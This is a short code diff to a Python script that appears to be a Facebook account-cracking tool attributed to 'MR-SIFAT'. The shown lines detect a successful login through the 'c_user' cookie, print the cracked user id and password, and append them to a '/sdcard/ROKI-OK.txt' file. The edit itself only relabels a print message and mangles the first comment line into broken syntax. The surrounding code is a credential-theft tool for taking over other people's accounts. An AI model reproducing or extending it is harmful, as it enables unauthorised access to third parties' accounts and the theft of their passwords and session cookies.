@@ -1,4 +1,4 @@
-#dec by MR-SIFAT
+I'm#dec by MR-SIFAT
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
@@ -291,7 +291,7 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;91m [ROKI-CP] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;91m [SORRY FOR-CP] '+cid+' | '+ps+'\33[0;92m')
                 #print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                 cps.append(cid)
                 open('/sdcard/ROKI-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
